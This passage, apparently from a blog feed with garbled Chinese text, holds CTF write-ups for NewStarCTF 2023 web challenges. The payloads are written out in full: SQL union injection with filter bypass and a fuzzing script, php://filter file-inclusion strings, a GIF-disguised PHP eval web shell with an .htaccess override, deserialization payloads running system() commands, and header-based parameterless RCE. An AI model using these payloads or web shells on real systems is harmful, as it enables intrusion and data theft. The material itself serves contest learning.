alt="image-20231004155327273"></p><p>å‘ç°ç½‘é¡µä¸ä¼šå›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯ä¼šå›æ˜¾æ•°æ®åº“ä¸­æœç´¢åˆ°ï¼Œå¹¶è¿”å›çš„ç»“æœé›†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯•è¯•ä¸€ä¸‹unionæ³¨å…¥æ³•:</p><p>ç¬¬ä¸€æ­¥ï¼šç”±äºunionæ³¨å…¥éœ€è¦ç¡®åˆ‡çŸ¥é“selectè¿”å›çš„å­—æ®µæ•°ï¼Œæ‰€ä»¥éœ€è¦å…ˆçˆ†æ•°æ®åº“çš„å­—æ®µ:</p><p>payload(order by,group by,union select 1,2,3,â€¦.):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160721249.png" alt="image-20231004160721249"></p><p>å‘ç°æœ‰è¿‡æ»¤,ä½¿ç”¨è„šæœ¬æ‰«ä¸€ä¸‹æœ‰å“ªäº›å…³é”®è¯è¿‡æ»¤:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://64a5def2-4e23-45a6-a6e6-22ec898fc9f2.node4.buuoj.cn:81/?id=&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    da = data<br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(data)</span><br>    <span class="hljs-comment"># da = &quot;1&#123;&#125;&quot;.format(data)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data)<br>    r = requests.get(url+da)<br>    <span class="hljs-comment"># ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br>    reponse_txt = <span class="hljs-string">&quot;no!&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     # da = d</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(d)</span><br><span class="hljs-comment">#     da = d</span><br><span class="hljs-comment">#     # POSTä¼ è¾“jsonæ•°æ®</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;query&quot;:da</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     reponse_txt = &quot;Nonono&quot;</span><br><span class="hljs-comment">#     # print(r.text)</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(d)</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(d))</span><br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004162813880.png" alt="image-20231004162813880"></p><p>æˆ‘ä»¬å…ˆå°è¯•ä½¿ç”¨å¤§å°å†™ç»•è¿‡æ³•:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160824030.png" alt="image-20231004160824030"></p><p>å‘ç°ç»•è¿‡ï¼ï¼ï¼</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,2,3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160937013.png" alt="image-20231004160937013"></p><p>å‘ç°å›æ˜¾å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šselectè¿”å›ç»“æœé›†çš„å­—æ®µä¸ªæ•°ä¸º5</p><p>ç¬¬äºŒæ­¥ï¼šçˆ†æ•°æ®åº“</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,database(),3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004163106775.png" alt="image-20231004163106775"></p><p>å¾—åˆ°æ•°æ®åº“:ctf</p><p>ç¬¬ä¸‰æ­¥ï¼šçˆ†è¡¨:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸¸è§„:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables Where table_schema= DATABASE(); -- &#x27;<br>æš´åŠ›æ–¹å¼:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables -- &#x27;<br></code></pre></td></tr></table></figure><p>å¸¸è§„:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164025606.png" alt="image-20231004164025606"></p><p>æš´åŠ›:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164224393.png" alt="image-20231004164224393"></p><p>æœ€ç»ˆæˆ‘ä»¬å‘ç°ä¸€ä¸ªå…³é”®çš„è¡¨:here_is_flag</p><p>ç¬¬å››æ­¥ï¼šçˆ†è¡¨çš„å­—æ®µ:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,Group_concat(column_name),3,4,5 from infOrmation_schema.COLUMNS Where table_schema = &#x27;ctf&#x27; And table_name = &#x27;here_is_flag&#x27;; -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170217827.png" alt="image-20231004170217827"></p><p>å¾—åˆ°å­—æ®µflag</p><p>ç¬¬äº”æ­¥ï¼šçˆ†å­—æ®µçš„å€¼:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1&#x27;union Select 1,Group_concat(flag),3,4,5 from here_is_flag -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170857984.png" alt="image-20231004170857984"></p><p>è·å¾—flag</p><h2 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-comment">//è¿™é‡Œè¿‡æ»¤äº†baseç¼–ç å’Œrotç¼–ç è·å–æ–‡ä»¶åŒ…å«ä¿¡æ¯</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-comment">//å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</span><br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br></code></pre></td></tr></table></figure><p>æä¾›æ–‡ä»¶åŒ…å«æ¼æ´çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>php://filter/read=convert.url-encode/resource=flag.php<br>php://filter/read=convert.base64-decode/resource=flag.php<br>php://filter/read=convert.base64url-decode/resource=flag.php<br>php://filter/read=convert.rot13/resource=flag.php<br>php://filter/read=convert.hex/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br>php://filter/read=convert.quoted-printable-decode/resource=flag.php<br>php://filter/read=convert.base64url-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004171344082.png" alt="image-20231004171344082"></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004171830952.png" alt="image-20231004171830952"></p><p>è¿™æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶å¹¶æŠ“åŒ…ä¸€ä¸‹:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172115084.png" alt="image-20231004172115084"></p><p>å‘ç°bpæ²¡æœ‰å“åº”ï¼Œå‰ç«¯ç›´æ¥è¿”å›åˆ¤æ–­ä¿¡æ¯ï¼Œè¦ä½¿bpèƒ½å¤ŸæŠ“å–ä¿¡æ¯ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­å…³é—­å‰ç«¯js</p><p>è¿™é‡Œå·æ‡’ç›´æ¥ä¸Šä¼ äº†ç”¨jså†™çš„phpæ–‡ä»¶çš„å›¾ç‰‡å½¢å¼:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">GIF89</span>a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;pass&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172603995.png" alt="image-20231004172603995"></p><p>å‘ç°æˆåŠŸä¸Šä¼ ï¼ï¼ï¼</p><p>ç”±äºæ— æ³•æŠ“åŒ…ï¼Œæˆ‘ä»¬éœ€è¦å†ä¸Šä¼ .htaccessæ–‡ä»¶å¯¹åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æŒ‡å®šå›¾ç‰‡æ–‡ä»¶è¿›è¡Œè§£æ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;FilesMatch &quot;showfiles3.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172835389.png" alt="image-20231004172835389"></p><p>å‘ç°æˆåŠŸä¸Šä¼ åˆ°åŒä¸€ç›®å½•ä¸‹</p><p>è®¿é—®æœ¨é©¬å›¾ç‰‡:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172930848.png" alt="image-20231004172930848"></p><p>æˆåŠŸï¼ï¼ï¼</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173020270.png" alt="image-20231004173020270"></p><p>å‘ç°flagæ–‡ä»¶:this_is_flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;cat /this_is_flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173154948.png" alt="image-20231004173154948"></p><h2 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//ç§æœ‰å˜é‡$cmd</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–ä¼šè‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//è¿‡æ»¤å¸¸è§„çš„æ–‡ä»¶æ‰“å¼€å‘½ä»¤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//è¿›è¡Œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</span><br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ååºåˆ—åŒ–ä¼ å…¥çš„å˜é‡å€¼</span><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ„é€ ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//ç§æœ‰å˜é‡åªèƒ½ç›´æ¥èµ‹å€¼</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">// @system($this-&gt;cmd);</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// @unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj1</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj1</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>è¿™é‡Œå‘ç°urlç¼–ç çš„å†…å®¹æ— æ³•è¢«æ‰§è¡Œï¼Œæ‰€ä»¥é‡‡ç”¨æºç <br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:4:&quot;ls /&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175532104.png" alt="image-20231004175532104"></p><p>å‘ç°æ–‡ä»¶:th1s_1s_fffflllll4444aaaggggg</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175916496.png" alt="image-20231004175916496"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004212050514.png" alt="image-20231004212050514"></p><p>æœ‰é¢˜ç›®çš„è‹±æ–‡æç¤ºå¾—ï¼Œè¯¥ç½‘é¡µå­˜åœ¨æ–‡ä»¶æ³„éœ²,å…ˆå°è¯•.gitæ³„éœ²ï¼š</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004212637348.png" alt="image-20231004212637348"></p><p>å‘ç°å­˜åœ¨bo0g1pop.php</p><p>å¯¹bo0g1pop.phpè¿›è¡Œä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//æ­£åˆ™åŒ¹é…funname(funname1()funname2())å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œå³æˆ‘ä»¬ä¸èƒ½ä¼ å‚æ•°åœ¨å‡½æ•°ä¸­</span><br><span class="hljs-comment">//\((?R)?\):è¡¨ç¤ºå°†()ä½œä¸ºé€’å½’çš„æ¨¡æ¿è¿›è¡Œé€’å½’åŒ¹é…å­—ç¬¦ä¸²ï¼Œé€’å½’ä¸€èˆ¬ä»æœ€é‡Œé¢è¿›è¡ŒåŒ¹é…</span><br><span class="hljs-comment">//æ— å‚RCE</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//å¯¹ä¸€äº›å‡½æ•°è¿›è¡Œè¿‡æ»¤</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<span class="hljs-comment">//å­˜åœ¨å±é™©ä»£ç æ‰§è¡Œæ¼æ´</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨æ— å‚RCEçš„å‡½æ•°:getallheaders()</p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è·å–httpè¯·æ±‚å¤´ä¸­çš„ä¿¡æ¯ï¼Œå¹¶ä»¥å…³è”æ•°ç»„çš„å½¢å¼è¿”å›:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">å…ˆè§‚å¯Ÿè¯¥ç½‘é¡µhttpè¯·æ±‚å¤´çš„ç¬¬ä¸€ä¸ªå¥æ˜¯è°:<br>?star=print(getallheaders());<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232607329.png" alt="image-20231004232607329"></p><p>ç”±äºç›´æ¥è¾“å‡ºæ•°ç»„å¤´å…ƒç´ ä¸ºArray,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨next()å‡½æ•°ä½¿æ•°ç»„å®šä½åˆ°ç¬¬äºŒä¸ªå…ƒç´ è¾“å‡ºï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232730086.png" alt="image-20231004232730086"></p><p>å‘ç°è¾“å‡ºäº†è¯·æ±‚å¤´User-Agentçš„å€¼ï¼Œå³ç¬¬äºŒä¸ªè¯·æ±‚å¤´çš„å€¼</p><p>æˆ‘ä»¬ä¼ªé€ ä¸€ä¸‹ç¬¬äºŒä¸ªè¯·æ±‚å¤´User-Agentçš„å†…å®¹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:666<br><br>?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234434183.png" alt="image-20231004234434183"></p><p>å‘ç°æˆåŠŸè¢«æ‰§è¡Œ</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;ls /&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234547770.png" alt="image-20231004234547770"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;head /flag&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234627391.png" alt="image-20231004234627391"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_ç¬¬ä¸€å‘¨WP</title>
    <link href="/2023/10/04/2023-10-4-Newstar_1/"/>
    <url>/2023/10/04/2023-10-4-Newstar_1/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-ç¬¬ä¸€å‘¨WP"><a href="#NewStarCTF-2023-ç¬¬ä¸€å‘¨WP" class="headerlink" title="NewStarCTF 2023_ç¬¬ä¸€å‘¨WP"></a>NewStarCTF 2023_ç¬¬ä¸€å‘¨WP</h1><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133137466.png" alt="image-20230926133137466"></p><p>æ ¹æ®ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦æä¾›å®ƒä¸€ä¸ªnumber1å’Œnumber2çš„å€¼ï¼Œæ²¡æœ‰å‘Šè¯‰æˆ‘ä»¬å…·ä½“çš„è¯·æ±‚æ–¹å¼ï¼Œæˆ‘ä»¬å…ˆç”¨getè¯·æ±‚å…ˆä¼ è¾“ä¸€ä¸ªnumber1å€¼è¯•è¯•:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?number1=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133446856.png" 